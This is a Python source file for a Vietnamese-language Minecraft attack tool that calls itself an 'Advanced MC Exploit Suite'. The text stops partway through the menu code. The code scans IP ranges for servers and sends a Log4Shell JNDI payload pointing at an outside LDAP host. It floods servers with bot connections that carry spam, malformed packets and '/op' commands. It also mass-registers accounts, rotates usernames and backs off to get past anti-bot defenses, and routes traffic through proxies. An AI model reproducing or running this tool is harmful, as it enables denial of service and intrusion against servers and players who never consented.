import socket
import threading
import time
import random
import string
import os
import re
import json
import csv
from datetime import datetime
import sys
import ipaddress
from concurrent.futures import ThreadPoolExecutor
import asyncio
import uuid

# Static key for authentication
VALID_KEY = "CfgTTool2025"
last_key_status = "Chưa xác thực"

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    INFO = '\033[96m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class Icons:
    ARROW = '➜'
    CHECK = '✓'
    CROSS = '✗'
    STAR = '★'
    WARNING = '⚠'
    INFO = 'ℹ'
    BULLET = '•'
    SPINNER = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

success_count = {'chat': 0, 'plugin': 0, 'keepalive': 0, 'custom': 0, 'backdoor': 0}
fail_count = {'chat': 0, 'plugin': 0, 'keepalive': 0, 'custom': 0, 'backdoor': 0}
lock = threading.Lock()
log_file = f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
config_file = "cfgt_config.json"
csv_file = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
credentials_file = "credentials.json"
scan_results_file = f"scan_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
packet_log = []

def load_config():
    default_config = {
        "ip": "127.0.0.1",
        "port": 25565,
        "rate_limit": 0.05,
        "packets_per_round": 10,
        "max_retries": 5,  # Increased retries
        "retry_delay": 0.5,
        "proxy_list": [],  # List of proxies: [{"host": "proxy_ip", "port": proxy_port}, ...]
        "timeout": 5.0  # Increased timeout
    }
    try:
        if os.path.exists(config_file):
            with open(config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
                for key, value in default_config.items():
                    if key not in config:
                        config[key] = value
                return config
    except json.JSONDecodeError as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi đọc config: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to read config: {str(e)[:15]}", "ERROR")
    return default_config

def save_config(config):
    try:
        with open(config_file, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi lưu config: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to save config: {str(e)[:15]}", "ERROR")

def reset_config():
    default_config = {
        "ip": "127.0.0.1",
        "port": 25565,
        "rate_limit": 0.05,
        "packets_per_round": 10,
        "max_retries": 5,
        "retry_delay": 0.5,
        "proxy_list": [],
        "timeout": 5.0
    }
    save_config(default_config)
    return default_config

def load_credentials():
    try:
        if os.path.exists(credentials_file):
            with open(credentials_file, 'r', encoding='utf-8') as f:
                return json.load(f)
    except json.JSONDecodeError as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi đọc credentials: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to read credentials: {str(e)[:15]}", "ERROR")
    return {}

def save_credentials(credentials):
    try:
        with open(credentials_file, 'w', encoding='utf-8') as f:
            json.dump(credentials, f, indent=4)
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi lưu credentials: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to save credentials: {str(e)[:15]}", "ERROR")

def log_message(message, level="INFO"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi ghi log: {str(e)[:15]}{Colors.ENDC}")

def export_to_csv(data):
    try:
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            if os.path.getsize(csv_file) == 0:
                writer.writerow(["Timestamp", "Packet ID", "Type", "Status", "Details"])
            writer.writerows(data)
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi xuất CSV: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to export CSV: {str(e)[:15]}", "ERROR")

def save_scan_results(results):
    try:
        with open(scan_results_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=4)
        print(f"{Colors.OKGREEN}{Icons.CHECK} Lưu kết quả quét: {scan_results_file}{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi lưu kết quả quét: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Failed to save scan results: {str(e)[:15]}", "ERROR")

def progress_bar(progress, total, width=20):
    filled = int(width * progress // total)
    bar = '█' * filled + '─' * (width - filled)
    percent = (progress / total * 100) if total > 0 else 0
    return f"{Colors.OKGREEN}[{bar}] {percent:.1f}%{Colors.ENDC}"

async def spinner_animation(message, stop_event, duration=0):
    start_time = time.time()
    i = 0
    while not stop_event.is_set() and (duration == 0 or time.time() - start_time < duration):
        sys.stdout.write(f"\r{Colors.OKBLUE}{Icons.SPINNER[i % len(Icons.SPINNER)]} {message}{Colors.ENDC}")
        sys.stdout.flush()
        i += 1
        await asyncio.sleep(0.1)
    sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")
    sys.stdout.flush()

async def status_bar(stop_event, duration, start_time):
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if duration == 0 or elapsed < duration:
            progress = elapsed if duration == 0 else min(elapsed, duration)
            total_success = sum(success_count.values())
            total_fail = sum(fail_count.values())
            stats = f"O: {Colors.OKGREEN}{total_success}{Colors.ENDC} | E: {Colors.FAIL}{total_fail}{Colors.ENDC}"
            sys.stdout.write(f"\r{progress_bar(progress, duration if duration != 0 else 60)} | {stats}")
            sys.stdout.flush()
            await asyncio.sleep(0.1)
    sys.stdout.write("\r" + " " * 70 + "\r")
    sys.stdout.flush()

def draw_summary_graph(success, fail):
    max_width = 10
    total = sum(success.values()) + sum(fail.values())
    if total == 0:
        return f"{Colors.INFO}Không có dữ liệu{Colors.ENDC}"
    result = [f"{Colors.HEADER}┌{'─' * 22}┐{Colors.ENDC}"]
    for pkt_type in success:
        s, f = success[pkt_type], fail[pkt_type]
        if s + f == 0:
            continue
        s_width = int(max_width * s / (s + f)) if s + f > 0 else 0
        result.append(f"{Colors.INFO}{pkt_type[:4].capitalize():<6}│{Colors.OKGREEN}{'█' * s_width}{Colors.FAIL}{'█' * (max_width - s_width)}{Colors.ENDC} ({s}/{f})│")
    result.append(f"{Colors.HEADER}└{'─' * 22}┘{Colors.ENDC}")
    return '\n'.join(result)

def encode_varint(value):
    result = b''
    while True:
        temp = value & 0x7F
        value >>= 7
        if value:
            temp |= 0x80
        result += bytes([temp])
        if not value:
            break
    return result

def encode_string(s):
    data = s.encode('utf-8')
    return encode_varint(len(data)) + data

def send_packet(sock, packet_id, data):
    packet = bytes([packet_id]) + data
    length = encode_varint(len(packet))
    sock.sendall(length + packet)
    packet_log.append({"id": packet_id, "data": data.hex(), "time": datetime.now().isoformat()})

def generate_username():
    prefixes = ["MC", "Pro", "Elite", "X", "Z", "Gamer", "Sky", "Nether", "End"]
    return f"{random.choice(prefixes)}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=8))}"  # Longer username

def generate_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))  # Stronger password

def random_chat():
    messages = ["Hello!", "Ping!", "CfgT!", "Test!", "Join!", "Hey!", "Online!"]
    return random.choice(messages) + ''.join(random.choices(string.ascii_letters, k=random.randint(5, 12)))  # Varied length

def check_server(ip, port, retries=5, timeout=5.0):
    test_sock = None
    latencies = []
    for attempt in range(retries):
        try:
            test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_sock.settimeout(timeout)
            start_time = time.time()
            test_sock.connect((ip, port))
            latency = (time.time() - start_time) * 1000
            latencies.append(latency)
            test_sock.close()
        except Exception as e:
            if attempt == retries - 1:
                log_message(f"Check server failed for {ip}:{port}: {str(e)[:20]}", "ERROR")
                return {"status": False, "error": str(e)[:20]}
            time.sleep(0.5)
            continue
    if not latencies:
        return {"status": False, "error": "Không thể kết nối"}
    avg_latency = sum(latencies) / len(latencies)
    latency_stability = max(latencies) - min(latencies)

    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(timeout)
        test_sock.connect((ip, port))
        handshake = (
            encode_varint(754) +
            encode_string(ip) +
            port.to_bytes(2, 'big') +
            encode_varint(1)
        )
        send_packet(test_sock, 0x00, handshake)
        send_packet(test_sock, 0x00, b'')
        test_sock.settimeout(2)
        response = b''
        while True:
            chunk = test_sock.recv(4096)
            if not chunk:
                break
            response += chunk
            if len(chunk) < 4096:
                break
        response = response.decode('utf-8', errors='ignore')

        player_count = "Unknown"
        max_players = "Unknown"
        version = "Unknown"
        protocol = "Unknown"
        motd = "Unknown"
        favicon = False
        vulnerabilities = []
        try:
            json_start = response.find('{')
            if json_start == -1:
                raise ValueError("No JSON found in response")
            json_data = response[json_start:]
            status = json.loads(json_data)
            player_count = status.get('players', {}).get('online', 'Unknown')
            max_players = status.get('players', {}).get('max', 'Unknown')
            version = status.get('version', {}).get('name', 'Unknown')
            protocol = status.get('version', {}).get('protocol', 'Unknown')
            motd_data = status.get('description', {})
            motd = motd_data.get('text', 'Unknown')[:20] if isinstance(motd_data, dict) else str(motd_data)[:20]
            favicon = bool(status.get('favicon', None))
            if version in ["1.12.2", "1.8.8"]:
                vulnerabilities.append(f"Old V:{version}")
            if "log4j" in response.lower():
                vulnerabilities.append("Log4J Risk")
            if "plugins" in response.lower():
                vulnerabilities.append("Plugin Leak")
        except (ValueError, json.JSONDecodeError) as e:
            vulnerabilities.append(f"Parse Error: {str(e)[:15]}")
        return {
            "status": True,
            "avg_latency": avg_latency,
            "latency_stability": latency_stability,
            "player_count": player_count,
            "max_players": max_players,
            "version": version,
            "protocol": protocol,
            "motd": motd,
            "favicon": favicon,
            "vulnerabilities": vulnerabilities
        }
    except Exception as e:
        log_message(f"Check server error for {ip}:{port}: {str(e)[:20]}", "ERROR")
        return {"status": False, "error": str(e)[:20]}
    finally:
        if test_sock:
            test_sock.close()

def test_vulnerability(ip, port, timeout=5.0):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        handshake = (
            encode_varint(754) +
            encode_string(ip) +
            port.to_bytes(2, 'big') +
            encode_varint(2)
        )
        send_packet(sock, 0x00, handshake)
        send_packet(sock, 0x00, encode_string(generate_username()))
        cmd = encode_string("${jndi:ldap://malicious.com/a}")
        send_packet(sock, 0x03, cmd)
        sock.settimeout(2)
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        if "log4j" in response.lower():
            return {"status": True, "result": "Log4J Vulnerable"}
        return {"status": False, "result": "No vuln"}
    except Exception as e:
        log_message(f"Vulnerability test failed for {ip}:{port}: {str(e)[:15]}", "ERROR")
        return {"status": False, "result": str(e)[:15]}
    finally:
        if sock:
            sock.close()

async def scan_ip_range(ip_range, port=25565, max_workers=50, timeout=5.0):
    try:
        network = ipaddress.ip_network(ip_range, strict=False)
        servers = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_server, str(ip), port, timeout=timeout): str(ip) for ip in network}
            for future in futures:
                result = await asyncio.get_event_loop().run_in_executor(None, future.result)
                if result["status"]:
                    servers.append((futures[future], port, result))
        return servers
    except ValueError as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Định dạng IP range không hợp lệ: {str(e)[:20]}{Colors.ENDC}")
        log_message(f"Invalid IP range format: {str(e)[:20]}", "ERROR")
        return []

def detect_auth_plugin(sock, timeout=1):
    try:
        sock.settimeout(timeout)
        response = sock.recv(4096).decode('utf-8', errors='ignore').lower()
        if any(keyword in response for keyword in ["login", "register", "password", "authme"]):
            return True
        return False
    except socket.timeout:
        return False
    except Exception:
        return False

def detect_anti_bot(sock, response, timeout=1):
    anti_bot_keywords = ["bot detected", "too many connections", "rate limit", "blacklisted", "captcha", "please wait", "try again in", "rejoin after"]
    try:
        if any(keyword in response.lower() for keyword in anti_bot_keywords):
            wait_match = re.search(r'(?:wait|try again|rejoin after)\s*(\d+)\s*(?:minutes?|seconds?)', response.lower())
            if wait_match:
                wait_time = int(wait_match.group(1))
                if "second" in response.lower():
                    return {"status": True, "wait_time": wait_time}
                return {"status": True, "wait_time": wait_time * 60}
            return {"status": True, "wait_time": 120}
        return {"status": False}
    except:
        return {"status": False}

class ConnectionPool:
    def __init__(self, max_size=20):  # Increased pool size
        self.pool = []
        self.max_size = max_size
        self.lock = threading.Lock()

    def get_connection(self, ip, port, timeout=5.0, proxy=None):
        with self.lock:
            for conn in self.pool:
                if conn["ip"] == ip and conn["port"] == port and not conn["in_use"]:
                    conn["in_use"] = True
                    return conn["sock"]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            if proxy:
                sock.connect((proxy["host"], proxy["port"]))
                # Simple SOCKS5 connect command (no authentication)
                sock.sendall(b'\x05\x01\x00\x01' + ipaddress.ip_address(ip).packed + port.to_bytes(2, 'big'))
                response = sock.recv(10)
                if response[:2] != b'\x05\x00':
                    raise Exception("Proxy connection failed")
            else:
                sock.connect((ip, port))
            self.pool.append({"ip": ip, "port": port, "sock": sock, "in_use": True})
            if len(self.pool) > self.max_size:
                old_conn = self.pool.pop(0)
                if not old_conn["in_use"]:
                    old_conn["sock"].close()
            return sock

    def release_connection(self, sock):
        with self.lock:
            for conn in self.pool:
                if conn["sock"] == sock:
                    conn["in_use"] = False
                    break

    def cleanup(self):
        with self.lock:
            for conn in self.pool[:]:
                if not conn["in_use"]:
                    conn["sock"].close()
                    self.pool.remove(conn)

connection_pool = ConnectionPool()

class MixedPacketFlooder:
    def __init__(self, ip, port, packet_id, rate_limit, packet_types, weights, custom_packet_size, burst_mode, max_retries, retry_delay, proxy=None):
        self.ip = ip
        self.port = port
        self.packet_id = packet_id
        self.rate_limit = rate_limit
        self.packet_types = packet_types
        self.weights = weights
        self.custom_packet_size = custom_packet_size
        self.burst_mode = burst_mode
        self.max_retries = max_retries
        self.retry_delay = retry_delay
        self.proxy = proxy
        self.sock = None
        self.username = generate_username()
        self.credentials = load_credentials()
        self.anti_bot_detected = False
        self.dynamic_rate = rate_limit
        self.username_pool = [generate_username() for _ in range(10)]  # Larger pool
        self.flagged_account = None
        self.packet_weights = {pt: weights.get(pt, 1) for pt in packet_types}
        self.backoff_factor = 1.0  # For exponential backoff

    def connect(self):
        retries = 0
        while retries < self.max_retries:
            try:
                self.sock = connection_pool.get_connection(self.ip, self.port, timeout=5.0, proxy=self.proxy)
                return True
            except Exception as e:
                retries += 1
                if retries == self.max_retries:
                    log_message(f"Connection failed for {self.ip}:{self.port} after {retries} retries: {str(e)[:15]}", "ERROR")
                    raise Exception(f"Retry fail: {str(e)[:15]}")
                time.sleep(self.retry_delay * self.backoff_factor * (1 + random.uniform(0.5, 1.5)))
                self.backoff_factor *= 1.5  # Exponential backoff
        return False

    async def wait_and_retry(self, wait_time):
        print(f"{Colors.WARNING}{Icons.WARNING} #{self.packet_id}@{self.ip}: Waiting {wait_time}s for {self.username} to retry{Colors.ENDC}")
        log_message(f"Waiting {wait_time}s for {self.username} to retry at {self.ip}:{self.port}", "INFO")
        await asyncio.sleep(wait_time * self.backoff_factor)
        self.backoff_factor = min(self.backoff_factor * 1.5, 10.0)  # Cap backoff
        self.flagged_account = self.username
        self.username = random.choice(self.username_pool)  # Rotate username
        if self.sock:
            connection_pool.release_connection(self.sock)
        self.sock = None
        if self.connect():
            handshake = (
                encode_varint(754) +
                encode_string(self.ip) +
                self.port.to_bytes(2, 'big') +
                encode_varint(2)
            )
            send_packet(self.sock, 0x00, handshake)
            send_packet(self.sock, 0x00, encode_string(self.username))
            await asyncio.sleep(random.uniform(0.5, 1.0))  # More human-like delay
            return await self.handle_auth()
        return False

    async def handle_auth(self):
        server_key = f"{self.ip}:{self.port}"
        if self.flagged_account:
            self.username = self.flagged_account
        else:
            self.username = random.choice(self.username_pool)
        if server_key in self.credentials and self.username in self.credentials[server_key]:
            password = self.credentials[server_key][self.username]
            send_packet(self.sock, 0x03, encode_string(f"/login {password}"))
            await asyncio.sleep(random.uniform(0.5, 1.0))
            response = ""
            try:
                response = self.sock.recv(4096).decode('utf-8', errors='ignore')
            except socket.timeout:
                pass
            anti_bot_result = detect_anti_bot(self.sock, response)
            if anti_bot_result["status"] and "wait_time" in anti_bot_result:
                self.anti_bot_detected = True
                return await self.wait_and_retry(anti_bot_result["wait_time"])
            if not detect_auth_plugin(self.sock) and not anti_bot_result["status"]:
                print(f"{Colors.OKGREEN}{Icons.CHECK} #{self.packet_id}@{self.ip}: Login ({self.username}){Colors.ENDC}")
                log_message(f"Successful login: {self.username} at {self.ip}:{self.port}", "INFO")
                return True
        password = generate_password()
        send_packet(self.sock, 0x03, encode_string(f"/register {password} {password}"))
        await asyncio.sleep(random.uniform(0.5, 1.0))
        response = ""
        try:
            response = self.sock.recv(4096).decode('utf-8', errors='ignore')
        except socket.timeout:
            pass
        anti_bot_result = detect_anti_bot(self.sock, response)
        if anti_bot_result["status"] and "wait_time" in anti_bot_result:
            self.anti_bot_detected = True
            return await self.wait_and_retry(anti_bot_result["wait_time"])
        if not detect_auth_plugin(self.sock) and not anti_bot_result["status"]:
            print(f"{Colors.OKGREEN}{Icons.CHECK} #{self.packet_id}@{self.ip}: Reg ({self.username}){Colors.ENDC}")
            log_message(f"Successful registration: {self.username} at {self.ip}:{self.port}", "INFO")
            if server_key not in self.credentials:
                self.credentials[server_key] = {}
            self.credentials[server_key][self.username] = password
            save_credentials(self.credentials)
            return True
        if anti_bot_result["status"]:
            self.anti_bot_detected = True
            print(f"{Colors.WARNING}{Icons.WARNING} #{self.packet_id}@{self.ip}: Anti-bot detected{Colors.ENDC}")
            log_message(f"Anti-bot detected at {self.ip}:{self.port}", "WARNING")
        return False

    def adjust_rate_limit(self):
        if self.anti_bot_detected:
            self.dynamic_rate = min(self.dynamic_rate * 2, 1.0)  # Increased max rate
            print(f"{Colors.WARNING}{Icons.WARNING} #{self.packet_id}@{self.ip}: Adjusted rate to {self.dynamic_rate}s{Colors.ENDC}")
            log_message(f"Adjusted rate to {self.dynamic_rate}s for {self.ip}:{self.port}", "INFO")
        else:
            self.dynamic_rate = max(self.dynamic_rate * 0.9, self.rate_limit * 0.5)

    def adjust_packet_weights(self, pkt_type, success):
        if not success and pkt_type in self.packet_weights:
            self.packet_weights[pkt_type] = max(1, self.packet_weights[pkt_type] - 1)
            print(f"{Colors.WARNING}{Icons.WARNING} #{self.packet_id}@{self.ip}: Reduced weight for {pkt_type} to {self.packet_weights[pkt_type]}{Colors.ENDC}")
            log_message(f"Reduced weight for {pkt_type} to {self.packet_weights[pkt_type]}", "INFO")

    async def run(self):
        global success_count, fail_count
        log_data = []
        try:
            if not self.connect():
                print(f"{Colors.FAIL}{Icons.CROSS} #{self.packet_id}@{self.ip}: No conn{Colors.ENDC}")
                log_data.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.packet_id, "connect", "ERR", "No conn"])
                with lock:
                    for pkt_type in self.packet_types:
                        fail_count[pkt_type] += 1
                export_to_csv(log_data)
                return

            handshake = (
                encode_varint(754) +
                encode_string(self.ip) +
                self.port.to_bytes(2, 'big') +
                encode_varint(2)
            )
            send_packet(self.sock, 0x00, handshake)
            send_packet(self.sock, 0x00, encode_string(self.username))
            await asyncio.sleep(random.uniform(0.5, 1.0))

            if detect_auth_plugin(self.sock):
                if not await self.handle_auth():
                    print(f"{Colors.FAIL}{Icons.CROSS} #{self.packet_id}@{self.ip}: No auth{Colors.ENDC}")
                    log_data.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.packet_id, "auth", "ERR", "No auth"])
                    with lock:
                        for pkt_type in self.packet_types:
                            fail_count[pkt_type] += 1
                    export_to_csv(log_data)
                    return

            num_packets = 200 if self.burst_mode and self.rate_limit <= 0.002 else (100 if self.burst_mode else random.randint(3, 8))  # Adjusted range
            for i in range(num_packets):
                if i % 10 == 0:
                    self.adjust_rate_limit()
                pkt_type = random.choices(self.packet_types, weights=[self.packet_weights.get(pt, 1) for pt in self.packet_types])[0]
                try:
                    payload = self.send_random_packet(pkt_type)
                    with lock:
                        success_count[pkt_type] += 1
                    log_data.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.packet_id, pkt_type, "OK", f"Sent {payload[:10]}"])
                except Exception as e:
                    with lock:
                        fail_count[pkt_type] += 1
                    log_data.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.packet_id, pkt_type, "ERR", str(e)[:15]])
                    self.adjust_packet_weights(pkt_type, False)
                    anti_bot_result = detect_anti_bot(self.sock, str(e))
                    if anti_bot_result["status"]:
                        self.anti_bot_detected = True
                        if "wait_time" in anti_bot_result:
                            if await self.wait_and_retry(anti_bot_result["wait_time"]):
                                continue
                        print(f"{Colors.WARNING}{Icons.WARNING} #{self.packet_id}@{self.ip}: Anti-bot triggered{Colors.ENDC}")
                        log_message(f"Anti-bot triggered at {self.ip}:{self.port}: {str(e)[:15]}", "WARNING")
                    self.username = random.choice(self.username_pool)  # Rotate username on failure
                await asyncio.sleep(random.uniform(self.dynamic_rate * 0.8, self.dynamic_rate * 1.2) if not self.burst_mode else random.uniform(0.01, 0.03))
            print(f"{Colors.OKGREEN}{Icons.CHECK} #{self.packet_id}@{self.ip}: OK{Colors.ENDC}")
            log_message(f"Completed packet flood for {self.ip}:{self.port}", "INFO")
        except Exception as e:
            print(f"{Colors.FAIL}{Icons.CROSS} #{self.packet_id}@{self.ip}: E:{str(e)[:10]}...{Colors.ENDC}")
            log_data.append([datetime.now().strftime("%Y-%m-%d %H:%M:%S"), self.packet_id, "general", "ERR", str(e)[:15]])
        finally:
            if self.sock:
                connection_pool.release_connection(self.sock)
            export_to_csv(log_data)

    def send_random_packet(self, pkt_type):
        if pkt_type == "chat":
            msg = random_chat()
            send_packet(self.sock, 0x03, encode_string(msg))
            return msg
        elif pkt_type == "plugin":
            channel = "MC|Brand"
            data = "CfgT_V1"
            send_packet(self.sock, 0x17, encode_string(channel) + encode_string(data))
            return f"{channel}:{data}"
        elif pkt_type == "keepalive":
            val = random.randint(10000, 999999)
            send_packet(self.sock, 0x21, encode_varint(val))
            return str(val)
        elif pkt_type == "custom":
            garbage = bytes(random.getrandbits(8) for _ in range(self.custom_packet_size))
            fake_id = random.randint(0x01, 0x3F)
            send_packet(self.sock, fake_id, garbage)
            return str(garbage[:10])
        elif pkt_type == "backdoor":
            cmd = "/op " + self.username
            send_packet(self.sock, 0x03, encode_string(cmd))
            return cmd

async def start_attack(servers, packets_per_round, duration, rate_limit, packet_types, weights, custom_packet_size, burst_mode, max_retries, retry_delay):
    global success_count, fail_count
    start_time = time.time()
    packet_id = 1
    stop_event = threading.Event()
    config = load_config()
    proxies = config.get("proxy_list", [])

    try:
        status_task = asyncio.create_task(status_bar(stop_event, duration, start_time))
        while True:
            tasks = []
            for ip, port in servers:
                for _ in range(packets_per_round):
                    proxy = random.choice(proxies) if proxies else None
                    flooder = MixedPacketFlooder(ip, port, packet_id, rate_limit, packet_types, weights, custom_packet_size, burst_mode, max_retries, retry_delay, proxy)
                    tasks.append(asyncio.create_task(flooder.run()))
                    packet_id += 1
                    await asyncio.sleep(random.uniform(0.01, 0.05))  # Slightly longer delay
                connection_pool.cleanup()  # Clean up unused connections
            await asyncio.gather(*tasks, return_exceptions=True)
            if duration != 0 and time.time() - start_time >= duration:
                break
        await status_task
    except asyncio.CancelledError:
        stop_event.set()
        await status_task
        print(f"{Colors.WARNING}{Icons.WARNING} Đã dừng bởi người dùng!{Colors.ENDC}")
        log_message("Attack stopped by user", "INFO")
    finally:
        stop_event.set()
        connection_pool.cleanup()
        total_time = int(time.time() - start_time)
        total_success = sum(success_count.values())
        total_fail = sum(fail_count.values())
        success_rate = (total_success / (total_success + total_fail) * 100) if (total_success + total_fail) > 0 else 0
        summary = (
            f"\n{Colors.HEADER}═════ Kết quả ═════{Colors.ENDC}\n"
            f"{Colors.OKGREEN}{Icons.CHECK} Thành công: {total_success}{Colors.ENDC}\n"
            f"{Colors.FAIL}{Icons.CROSS} Thất bại: {total_fail}{Colors.ENDC}\n"
            f"{Colors.INFO}Tỷ lệ thành công: {success_rate:.0f}%{Colors.ENDC}\n"
            f"{Colors.INFO}Thời gian: {total_time}s{Colors.ENDC}\n"
            f"{Colors.INFO}Log: {log_file}{Colors.ENDC}\n"
            f"{Colors.INFO}CSV: {csv_file}{Colors.ENDC}\n"
            f"{Colors.INFO}Biểu đồ:\n{draw_summary_graph(success_count, fail_count)}{Colors.ENDC}"
        )
        print(summary)
        log_message(f"Kết thúc - Thành công: {total_success}, Thất bại: {total_fail}, Tỷ lệ: {success_rate:.0f}%, Thời gian: {total_time}s", "INFO")
        input(f"\n{Colors.BOLD}{Icons.ARROW} Nhấn Enter để tiếp tục{Colors.ENDC}")

def replay_packets(ip, port, packet_ids, timeout=5.0):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        for pkt in packet_log:
            if pkt["id"] in packet_ids:
                send_packet(sock, pkt["id"], bytes.fromhex(pkt["data"]))
                print(f"{Colors.OKGREEN}{Icons.CHECK} Replayed packet {pkt['id']} at {ip}:{port}{Colors.ENDC}")
                log_message(f"Replayed packet {pkt['id']} at {ip}:{port}", "INFO")
                time.sleep(0.1)
    except Exception as e:
        print(f"{Colors.FAIL}{Icons.CROSS} Lỗi replay: {str(e)[:15]}{Colors.ENDC}")
        log_message(f"Replay error: {str(e)[:15]}", "ERROR")
    finally:
        if sock:
            sock.close()

def auto_tune_config(server_status):
    rate_limit = 0.05 if server_status["avg_latency"] < 100 else 0.1
    packets_per_round = 20 if server_status["player_count"] != "Unknown" and isinstance(server_status["player_count"], int) and server_status["player_count"] > 10 else 10
    burst_mode = server_status["avg_latency"] < 50
    return {"rate_limit": rate_limit, "packets_per_round": packets_per_round, "burst_mode": burst_mode}

def typing_effect(text, delay=0.02):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def validate_key():
    global last_key_status
    key = input(f"{Colors.BOLD}{Icons.ARROW} Nhập key: {Colors.ENDC}").strip()
    if key == VALID_KEY:
        last_key_status = f"{Colors.OKGREEN}Đã xác thực{Colors.ENDC}"
        return True
    last_key_status = f"{Colors.FAIL}Key sai{Colors.ENDC}"
    print(f"{Colors.FAIL}{Icons.CROSS} Key không hợp lệ!{Colors.ENDC}")
    return False

def display_scan_results(servers):
    if not servers:
        print(f"{Colors.FAIL}{Icons.CROSS} Không tìm thấy server!{Colors.ENDC}")
        return
    print(f"{Colors.HEADER}┌{'─' * 15}┬{'─' * 7}┬{'─' * 10}┬{'─' * 10}┬{'─' * 20}┬{'─' * 20}┐{Colors.ENDC}")
    print(f"{Colors.HEADER}│ {'IP:Port':<13} │ {'Ping':<5} │ {'Players':<8} │ {'Version':<8} │ {'MOTD':<18} │ {'Vulnerabilities':<18} │{Colors.ENDC}")
    print(f"{Colors.HEADER}├{'─' * 15}┼{'─' * 7}┼{'─' * 10}┼{'─' * 10}┼{'─' * 20}┼{'─' * 20}┤{Colors.ENDC}")
    results = []
    for ip, port, status in servers:
        players = f"{status['player_count']}/{status['max_players']}"
        vuln = ", ".join(status["vulnerabilities"]) or "None"
        print(f"{Colors.INFO}│ {f'{ip}:{port}':<13} │ {status['avg_latency']:<5.0f}ms │ {players:<8} │ {status['version']:<8} │ {status['motd']:<18} │ {vuln:<18} │{Colors.ENDC}")
        results.append({"ip": ip, "port": port, **status})
    print(f"{Colors.HEADER}└{'─' * 15}┴{'─' * 7}┴{'─' * 10}┴{'─' * 10}┴{'─' * 20}┴{'─' * 20}┘{Colors.ENDC}")
    save_scan_results(results)

async def show_menu():
    global success_count, fail_count, last_key_status
    if not validate_key():
        return
    config = load_config()
    while True:
        clear_screen()
        banner = (
            f"{Colors.HEADER}╔════════════════════════════╗{Colors.ENDC}\n"
            f"{Colors.HEADER}║      CfgT Tool V2.2        ║{Colors.ENDC}\n"
            f"{Colors.OKBLUE}║ Advanced MC Exploit Suite  ║{Colors.ENDC}\n"
            f"{Colors.HEADER}╚════════════════════════════╝{Colors.ENDC}"
        )
        typing_effect(banner)
        print(f"{Colors.INFO}Trạng thái: {last_key_status} | Thời gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}{Colors.ENDC}")
        menu_options = [
            ("1. Thông tin", "Tool"),
            ("2. Hướng dẫn", "Sử dụng"),
            ("3. Reset config", "Khôi phục"),
            ("4. Quét server", "Kiểm tra"),
            ("5. Quét IP range", "Tìm server"),
            ("6. Tấn công", f"{config['ip']}:{config['port']}"),
            ("7. Replay packets", "Gửi lại"),
            ("0. Thoát", "Quit")
        ]
        print(f"{Colors.HEADER}┌{'─' * 20}┬{'─' * 15}┐{Colors.ENDC}")
        for option, desc in menu_options:
            print(f"{Colors.OKGREEN}│ {option:<18} │ {desc:<13} │{Colors.ENDC}")
        print(f"{Colors.HEADER}└{'─' * 20}┴{'─' * 15}┘{Colors.ENDC}")

        choice = input(f"\n{Colors.BOLD}{Icons.ARROW} Chọn (0-7): {Colors.ENDC}").strip()
        if choice not in [str(i) for i in range(8)]:
            print(f"{Colors.FAIL}{Icons.CROSS} Lựa chọn không hợp lệ! Vui lòng chọn từ 0-7.{Colors.ENDC}")
            await asyncio.sleep(1)
            continue

        if choice == "1":
            clear_screen()
            print(f"{Colors.OKGREEN}CfgT Tool V2.2{Colors.ENDC}")
